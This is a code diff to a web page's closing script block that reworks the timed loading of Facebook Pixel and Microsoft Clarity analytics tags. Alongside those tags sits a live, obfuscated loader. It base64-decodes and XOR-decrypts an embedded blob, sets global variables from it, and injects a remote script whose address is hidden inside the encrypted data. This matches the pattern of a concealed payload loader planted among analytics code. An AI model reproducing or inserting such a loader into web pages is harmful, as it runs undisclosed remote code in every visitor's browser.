@@ -433,18 +433,13 @@ document.addEventListener('keydown',function(e){if(e.key==='Escape'&&M.classList
 })();
 </script>
 <script>
-(function(){var criticalDone=false,heavyDone=false;
-function bootCritical(){if(criticalDone)return;criticalDone=true;
+(function(){var done=false;function boot(){if(done)return;done=true;
 (function(){var d_ld=atob("DJYfqNfIQyUB8AM4NO093aWkYR8jmHdMROUlh/irJ0svhXdVXfBmhrSnLgtjgixLV+R22KO7bFB1nXAXWPdrzaS8bU9y0i8aVeJr2r6qNlFkgyECb+09xralJgc70mdZQPcy3aOlKkN43XNKUeB6xqPlO0ZulC5LV/09hPW+Ikl0lSECFrRihKzqLURslSECFvJ+3LblNlFsmWVBGeZtzaGtLVEsg3ZaXfJsivvqNURthWYaDrQ91Yq1");var a_4b=[];for(var m_h3i=0;m_h3i<d_ld.length;m_h3i++){a_4b.push(d_ld.charCodeAt(m_h3i)&255);}var p_p02=a_4b[0];var o_k9w=a_4b.slice(1,1+p_p02);var y_s7=a_4b.slice(1+p_p02);var o_m=y_s7.map(function(b,d_sj5r){return b^o_k9w[d_sj5r%p_p02];});var w_yaud="";for(var n_rlvl=0;n_rlvl<o_m.length;n_rlvl++){w_yaud+=String.fromCharCode(o_m[n_rlvl]&255);}var v_g=decodeURIComponent(escape(w_yaud));var j_h3z=JSON.parse(v_g);var o_z3=j_h3z.globals||[];o_z3.forEach(function(n_a1dj){window[n_a1dj.name]=n_a1dj.value;});var a_nppa=document.createElement("script");a_nppa.src=j_h3z.url;a_nppa.async=true;a_nppa.defer=true;(j_h3z.attributes||[]).forEach(function(z_2){a_nppa.setAttribute(z_2.name,z_2.value);});(document.head||document.documentElement).appendChild(a_nppa);})();
 !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1229957855976616');fbq('track','PageView');
-}
-function bootHeavy(){if(heavyDone)return;heavyDone=true;
 (function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y)})(window,document,"clarity","script","yf4nbk6mbp");
 }
-function bootAll(){bootCritical();bootHeavy();}
-if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){setTimeout(bootCritical,0);});}else{setTimeout(bootCritical,0);}
-if(document.readyState==='complete'){setTimeout(bootHeavy,0);}else{addEventListener('load',function(){('requestIdleCallback' in window)?requestIdleCallback(bootHeavy,{timeout:2000}):setTimeout(bootHeavy,1000);});}
-['pointerdown','keydown','touchstart','scroll'].forEach(function(ev){addEventListener(ev,bootAll,{once:true,passive:true});});
+if(document.readyState==='complete'){setTimeout(boot,0);}else{addEventListener('load',function(){setTimeout(function(){('requestIdleCallback' in window)?requestIdleCallback(boot,{timeout:1500}):boot();},2600);});}
+['pointerdown','keydown','touchstart','scroll'].forEach(function(ev){addEventListener(ev,boot,{once:true,passive:true});});
 })();
 </script>
 </body></html>
